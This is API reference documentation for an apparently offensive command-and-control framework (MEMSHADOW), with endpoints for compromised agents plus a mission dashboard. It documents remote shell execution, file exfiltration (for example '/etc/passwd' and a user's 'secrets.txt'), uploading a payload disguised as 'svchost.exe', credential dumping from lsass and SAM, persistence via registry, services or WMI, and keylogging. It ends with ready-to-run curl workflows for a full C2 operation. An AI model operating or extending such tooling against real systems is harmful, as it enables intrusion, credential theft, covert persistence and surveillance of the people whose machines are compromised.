# MEMSHADOW API Reference

**Classification:** UNCLASSIFIED
**Version:** 2.1
**Date:** 2025-11-16
**Status:** OFFICIAL

---

## Table of Contents

1. [Overview](#overview)
2. [Authentication](#authentication)
3. [C2 Framework API](#c2-framework-api)
4. [TEMPEST Dashboard API](#tempest-dashboard-api)
5. [Memory & Vector API](#memory--vector-api)
6. [Health & Monitoring](#health--monitoring)
7. [Response Formats](#response-formats)
8. [Error Codes](#error-codes)

---

## Overview

### Base URL

```
http://localhost:8000/api/v1
```

### API Versioning

Current version: `v1`

All API endpoints are prefixed with `/api/v1` unless otherwise noted.

### Content Type

All requests and responses use `application/json` unless otherwise specified.

---

## Authentication

### JWT Authentication

**Endpoint:** `POST /auth/login`

**Request:**
```json
{
  "username": "operator",
  "password": "your_password"
}
```

**Response:**
```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 3600
}
```

**Usage:**
```bash
curl -H "Authorization: Bearer <token>" http://localhost:8000/api/v1/endpoint
```

---

## C2 Framework API

### Agent Registration

**Endpoint:** `POST /c2/register`

Register a new C2 agent with the controller.

**Request:**
```json
{
  "agent_id": "agent_abc123",
  "hostname": "target-workstation",
  "ip": "192.168.1.100",
  "os_info": "Windows 10 Pro",
  "username": "john.doe"
}
```

**Response:**
```json
{
  "status": "success",
  "session_id": "550e8400-e29b-41d4-a716-446655440000",
  "encryption_key": "base64_encoded_key",
  "message": "Agent registered successfully"
}
```

---

### List Sessions

**Endpoint:** `GET /c2/sessions`

Get all C2 sessions.

**Query Parameters:**
- `active_only` (boolean): Filter for active sessions only (default: false)

**Response:**
```json
{
  "status": "success",
  "count": 3,
  "sessions": [
    {
      "session_id": "550e8400-e29b-41d4-a716-446655440000",
      "agent_id": "agent_abc123",
      "hostname": "target-workstation",
      "ip": "192.168.1.100",
      "os_info": "Windows 10 Pro",
      "username": "john.doe",
      "status": "active",
      "established_at": "2025-11-16T14:30:00Z",
      "last_seen": "2025-11-16T15:45:00Z",
      "tasks_sent": 5,
      "tasks_completed": 4,
      "data_exfiltrated_bytes": 1048576
    }
  ]
}
```

---

### Get Session Details

**Endpoint:** `GET /c2/sessions/{session_id}`

Get detailed information about a specific session.

**Response:**
```json
{
  "status": "success",
  "session": {
    "session_id": "550e8400-e29b-41d4-a716-446655440000",
    "agent_id": "agent_abc123",
    "hostname": "target-workstation",
    "status": "active",
    "last_seen": "2025-11-16T15:45:00Z"
  }
}
```

---

### Execute Shell Command

**Endpoint:** `POST /c2/sessions/{session_id}/shell`

Execute a shell command on the agent.

**Request:**
```json
{
  "command": "whoami"
}
```

**Response:**
```json
{
  "status": "success",
  "task_id": "task_001",
  "message": "Shell command queued"
}
```

---

### Download File

**Endpoint:** `POST /c2/sessions/{session_id}/download`

Download a file from the agent.

**Request:**
```json
{
  "remote_path": "/etc/passwd",
  "local_path": "./exfil/passwd"
}
```

**Response:**
```json
{
  "status": "success",
  "task_id": "task_002",
  "message": "Download queued"
}
```

---

### Upload File

**Endpoint:** `POST /c2/sessions/{session_id}/upload`

Upload a file to the agent.

**Request:**
```json
{
  "local_path": "./payloads/tool.exe",
  "remote_path": "C:\\Windows\\Temp\\svchost.exe"
}
```

**Response:**
```json
{
  "status": "success",
  "task_id": "task_003",
  "message": "Upload queued"
}
```

---

### Enumerate System

**Endpoint:** `POST /c2/sessions/{session_id}/enumerate`

Enumerate system information (users, processes, network, etc.).

**Response:**
```json
{
  "status": "success",
  "task_id": "task_004",
  "message": "Enumeration queued"
}
```

---

### Dump Credentials

**Endpoint:** `POST /c2/sessions/{session_id}/dump-creds`

Dump credentials from the target system.

**Query Parameters:**
- `method` (string): Dumping method - `auto`, `lsass`, `sam`, `registry` (default: auto)

**Response:**
```json
{
  "status": "success",
  "task_id": "task_005",
  "message": "Credential dumping queued"
}
```

---

### Establish Persistence

**Endpoint:** `POST /c2/sessions/{session_id}/persistence`

Establish persistence mechanism on the agent.

**Query Parameters:**
- `method` (string): Persistence method - `registry`, `service`, `scheduled_task`, `wmi` (default: registry)

**Response:**
```json
{
  "status": "success",
  "task_id": "task_006",
  "message": "Persistence queued"
}
```

---

### Send Task

**Endpoint:** `POST /c2/sessions/{session_id}/tasks`

Send a custom task to the agent.

**Request:**
```json
{
  "task_type": "custom",
  "params": {
    "action": "keylog",
    "duration": 300
  }
}
```

**Response:**
```json
{
  "status": "success",
  "task": {
    "task_id": "task_007",
    "task_type": "custom",
    "params": {"action": "keylog", "duration": 300},
    "status": "queued"
  }
}
```

---

### Get Pending Tasks (Agent)

**Endpoint:** `GET /c2/tasks/{agent_id}`

Retrieve pending tasks for an agent (called by agent beacon).

**Response:**
```json
{
  "status": "success",
  "count": 2,
  "tasks": [
    {
      "task_id": "task_001",
      "task_type": "shell",
      "params": {"command": "whoami"}
    },
    {
      "task_id": "task_002",
      "task_type": "download",
      "params": {"remote_path": "/etc/passwd", "local_path": "./passwd"}
    }
  ]
}
```

---

### Submit Task Result (Agent)

**Endpoint:** `POST /c2/results`

Submit task result from agent.

**Request:**
```json
{
  "agent_id": "agent_abc123",
  "task_id": "task_001",
  "result": {
    "status": "success",
    "output": "DOMAIN\\john.doe",
    "error": null
  }
}
```

**Response:**
```json
{
  "status": "success",
  "message": "Result received"
}
```

---

### Get Task Results

**Endpoint:** `GET /c2/results/{agent_id}`

Get task results for an agent.

**Query Parameters:**
- `task_id` (string, optional): Filter by specific task ID

**Response:**
```json
{
  "status": "success",
  "count": 1,
  "results": [
    {
      "task_id": "task_001",
      "status": "success",
      "output": "DOMAIN\\john.doe",
      "completed_at": "2025-11-16T15:30:00Z"
    }
  ]
}
```

---

### Terminate Session

**Endpoint:** `DELETE /c2/sessions/{session_id}`

Terminate a C2 session.

**Response:**
```json
{
  "status": "success",
  "message": "Session terminated"
}
```

---

### C2 Dashboard

**Endpoint:** `GET /c2/dashboard`

Get comprehensive C2 statistics.

**Response:**
```json
{
  "status": "success",
  "dashboard": {
    "total_sessions": 5,
    "active_sessions": 3,
    "dead_sessions": 2,
    "total_tasks_sent": 42,
    "total_tasks_completed": 38,
    "total_data_exfiltrated": 10485760,
    "sessions": [
      {
        "session_id": "550e8400-e29b-41d4-a716-446655440000",
        "hostname": "target-workstation",
        "status": "active",
        "tasks_sent": 5,
        "tasks_completed": 4
      }
    ]
  }
}
```

---

## TEMPEST Dashboard API

### Dashboard Status

**Endpoint:** `GET /tempest/dashboard/status`

Get comprehensive TEMPEST dashboard status with military-grade formatting.

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 154530Z",
  "system_status": "OPERATIONAL",
  "missions": {
    "active": 2,
    "completed": 5,
    "failed": 0,
    "total": 7,
    "details": [
      {
        "classification": "UNCLASSIFIED",
        "mission_id": "mission_001",
        "mission_name": "Network Reconnaissance",
        "status": "RUNNING",
        "stages_completed": 2,
        "stages_total": 4,
        "progress_pct": 50.0,
        "vulnerabilities_found": 3,
        "iocs_detected": 12,
        "agents_deployed": 3
      }
    ]
  },
  "alerts": {
    "total": 15,
    "critical": 2,
    "high": 5,
    "medium": 6,
    "low": 2,
    "recent": []
  },
  "agents": {
    "deployed": 8,
    "task_queues": {
      "recon": 2,
      "crawler": 1,
      "apimapper": 0,
      "authtest": 0,
      "bgp": 0,
      "blockchain": 0
    },
    "total_pending_tasks": 3
  },
  "sentinel": {
    "active_monitors": 5,
    "alerts_24h": 15
  }
}
```

---

### Start Mission

**Endpoint:** `POST /tempest/dashboard/mission/start`

Initiate a new mission (ENUMERATE phase).

**Request:**
```json
{
  "mission_file": "missions/classified/SECRET_advanced_persistent_threat.yaml"
}
```

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 154600Z",
  "status": "MISSION_INITIATED",
  "mission_id": "mission_007",
  "mission_name": "Advanced Persistent Threat Simulation",
  "message": "ENUMERATE phase started - agents deploying"
}
```

---

### Get Mission Status

**Endpoint:** `GET /tempest/dashboard/mission/{mission_id}`

Get detailed mission status (PLAN phase monitoring).

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 154700Z",
  "mission": {
    "mission_id": "mission_007",
    "mission_name": "Advanced Persistent Threat Simulation",
    "status": "RUNNING",
    "stages_completed": 1,
    "stages_total": 3,
    "progress_pct": 33.33
  },
  "stages": [
    {
      "stage_id": "recon",
      "description": "Network reconnaissance",
      "status": "completed",
      "tasks": 3,
      "success_criteria": ["hosts_discovered"]
    },
    {
      "stage_id": "exploit",
      "description": "Exploitation phase",
      "status": "pending",
      "tasks": 5,
      "success_criteria": ["shell_obtained"]
    }
  ],
  "vulnerabilities": [
    {
      "type": "SQL Injection",
      "cvss": 9.1,
      "url": "https://target.com/api/users"
    }
  ],
  "iocs": [
    {
      "type": "ipv4",
      "value": "192.168.1.100",
      "threat_level": "high"
    }
  ],
  "recommendations": [
    "Patch SQL injection vulnerability in /api/users endpoint"
  ]
}
```

---

### Stop Mission

**Endpoint:** `POST /tempest/dashboard/mission/{mission_id}/stop`

Stop a running mission (emergency abort).

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 154800Z",
  "status": "MISSION_ABORTED",
  "mission_id": "mission_007",
  "message": "Mission stopped by operator"
}
```

---

### Get IoCs

**Endpoint:** `GET /tempest/dashboard/intel/iocs`

Retrieve Indicators of Compromise.

**Query Parameters:**
- `severity` (string, optional): Filter by severity - `critical`, `high`, `medium`, `low`
- `limit` (integer): Maximum results (default: 100)

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 154900Z",
  "total_iocs": 25,
  "iocs": [
    {
      "type": "ipv4",
      "value": "192.168.1.100",
      "threat_level": "high",
      "first_seen": "2025-11-16T14:00:00Z",
      "context": "C2 server communication"
    },
    {
      "type": "domain",
      "value": "malicious.example.com",
      "threat_level": "critical",
      "first_seen": "2025-11-16T14:15:00Z",
      "context": "Phishing campaign"
    }
  ],
  "threat_summary": {
    "critical": 5,
    "high": 10,
    "medium": 7,
    "low": 3
  }
}
```

---

### Get Vulnerabilities

**Endpoint:** `GET /tempest/dashboard/intel/vulnerabilities`

Retrieve discovered vulnerabilities.

**Query Parameters:**
- `min_cvss` (float, optional): Minimum CVSS score filter
- `limit` (integer): Maximum results (default: 100)

**Response:**
```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 155000Z",
  "total_vulnerabilities": 12,
  "vulnerabilities": [
    {
      "type": "SQL Injection",
      "cvss": 9.1,
      "url": "https://target.com/api/users",
      "risk_indicator": "🔴 CRITICAL",
      "description": "Union-based SQL injection in user parameter",
      "remediation": "Use parameterized queries"
    },
    {
      "type": "XSS",
      "cvss": 7.2,
      "url": "https://target.com/search",
      "risk_indicator": "🟠 HIGH",
      "description": "Reflected XSS in search parameter",
      "remediation": "Implement output encoding"
    }
  ],
  "severity_distribution": {
    "critical": 3,
    "high": 5,
    "medium": 3,
    "low": 1
  }
}
```

---

### WebSocket Dashboard

**Endpoint:** `WS /tempest/dashboard/ws`

WebSocket connection for real-time dashboard updates (EXECUTE phase monitoring).

**Connect:**
```javascript
const ws = new WebSocket('ws://localhost:8000/api/v1/tempest/dashboard/ws');

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log(data);
};
```

**Message Types:**

**Connected:**
```json
{
  "type": "connected",
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 155100Z",
  "message": "Dashboard WebSocket connected"
}
```

**Mission Update:**
```json
{
  "type": "mission_update",
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 155200Z",
  "mission_id": "mission_007",
  "status": "COMPLETED",
  "data": {
    "vulnerabilities_found": 5,
    "iocs_detected": 15
  }
}
```

**Ping:**
```json
{
  "type": "ping",
  "timestamp_zulu": "20251116 155300Z"
}
```

---

## Memory & Vector API

### Store Memory

**Endpoint:** `POST /memory/store`

Store a memory with vector embeddings.

**Request:**
```json
{
  "content": "Target system running Windows 10 with outdated patches",
  "metadata": {
    "source": "reconnaissance",
    "target": "192.168.1.100",
    "classification": "UNCLASSIFIED"
  }
}
```

**Response:**
```json
{
  "status": "success",
  "memory_id": "mem_abc123",
  "vector_stored": true
}
```

---

### Search Memories

**Endpoint:** `POST /memory/search`

Semantic search across stored memories.

**Request:**
```json
{
  "query": "Windows vulnerabilities",
  "limit": 10,
  "min_relevance": 0.7
}
```

**Response:**
```json
{
  "status": "success",
  "results": [
    {
      "memory_id": "mem_abc123",
      "content": "Target system running Windows 10 with outdated patches",
      "relevance_score": 0.92,
      "metadata": {
        "source": "reconnaissance",
        "target": "192.168.1.100"
      }
    }
  ]
}
```

---

## Health & Monitoring

### Health Check

**Endpoint:** `GET /health`

Simple health check endpoint.

**Response:**
```json
{
  "status": "healthy",
  "version": "2.1",
  "timestamp": "2025-11-16T15:54:00Z"
}
```

---

### Detailed Health

**Endpoint:** `GET /health/detailed`

Detailed system health with database connectivity.

**Response:**
```json
{
  "status": "healthy",
  "version": "2.1",
  "components": {
    "postgres": "connected",
    "redis": "connected",
    "chromadb": "connected"
  },
  "uptime_seconds": 86400
}
```

---

## Response Formats

### Standard Success Response

```json
{
  "status": "success",
  "data": {},
  "message": "Operation completed successfully"
}
```

### Standard Error Response

```json
{
  "status": "error",
  "error": {
    "code": "VALIDATION_ERROR",
    "message": "Invalid input parameters",
    "details": {}
  }
}
```

### TEMPEST-Formatted Response

```json
{
  "classification": "UNCLASSIFIED",
  "timestamp_zulu": "20251116 155500Z",
  "status": "success",
  "data": {}
}
```

---

## Error Codes

| Code | HTTP Status | Description |
|------|-------------|-------------|
| `VALIDATION_ERROR` | 400 | Invalid request parameters |
| `UNAUTHORIZED` | 401 | Authentication required |
| `FORBIDDEN` | 403 | Insufficient permissions |
| `NOT_FOUND` | 404 | Resource not found |
| `CONFLICT` | 409 | Resource conflict |
| `INTERNAL_ERROR` | 500 | Internal server error |
| `SERVICE_UNAVAILABLE` | 503 | Service temporarily unavailable |

### C2-Specific Errors

| Code | Description |
|------|-------------|
| `SESSION_NOT_FOUND` | C2 session does not exist |
| `SESSION_DEAD` | C2 session is no longer active |
| `TASK_FAILED` | Agent task execution failed |
| `AGENT_OFFLINE` | Agent not responding to beacons |

### TEMPEST-Specific Errors

| Code | Description |
|------|-------------|
| `MISSION_NOT_FOUND` | Mission ID does not exist |
| `MISSION_FAILED` | Mission execution failed |
| `INSUFFICIENT_CLEARANCE` | Operation requires higher classification |
| `SWARM_UNAVAILABLE` | SWARM agents not responding |

---

## Rate Limiting

Rate limits apply to all API endpoints:

- **Authenticated requests:** 1000 requests/hour
- **Unauthenticated requests:** 100 requests/hour
- **C2 beacons:** No rate limit

Rate limit headers:
```
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 998
X-RateLimit-Reset: 1700155200
```

---

## OpenAPI / Swagger

Interactive API documentation available at:

```
http://localhost:8000/api/v1/docs
```

OpenAPI JSON schema:

```
http://localhost:8000/api/v1/openapi.json
```

---

## Example Workflows

### Complete C2 Operation

```bash
# 1. Register agent
curl -X POST http://localhost:8000/api/v1/c2/register \
  -H "Content-Type: application/json" \
  -d '{
    "agent_id": "agent_001",
    "hostname": "target-pc",
    "ip": "192.168.1.100",
    "os_info": "Windows 10",
    "username": "john.doe"
  }'

# 2. Execute shell command
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/shell \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

# 3. Download file
curl -X POST http://localhost:8000/api/v1/c2/sessions/{session_id}/download \
  -H "Content-Type: application/json" \
  -d '{
    "remote_path": "C:\\Users\\john.doe\\Desktop\\secrets.txt",
    "local_path": "./exfil/secrets.txt"
  }'

# 4. Get results
curl http://localhost:8000/api/v1/c2/results/agent_001
```

### Mission Execution

```bash
# 1. Start mission
curl -X POST http://localhost:8000/api/v1/tempest/dashboard/mission/start \
  -H "Content-Type: application/json" \
  -d '{"mission_file": "missions/UNCLASSIFIED_basic_recon.yaml"}'

# 2. Monitor status
curl http://localhost:8000/api/v1/tempest/dashboard/mission/{mission_id}

# 3. Get discovered vulnerabilities
curl http://localhost:8000/api/v1/tempest/dashboard/intel/vulnerabilities?min_cvss=7.0

# 4. Get IoCs
curl http://localhost:8000/api/v1/tempest/dashboard/intel/iocs?severity=critical
```

---

**END OF API REFERENCE**

**CLASSIFICATION: UNCLASSIFIED**
**FOR OFFICIAL USE BY AUTHORIZED PERSONNEL ONLY**
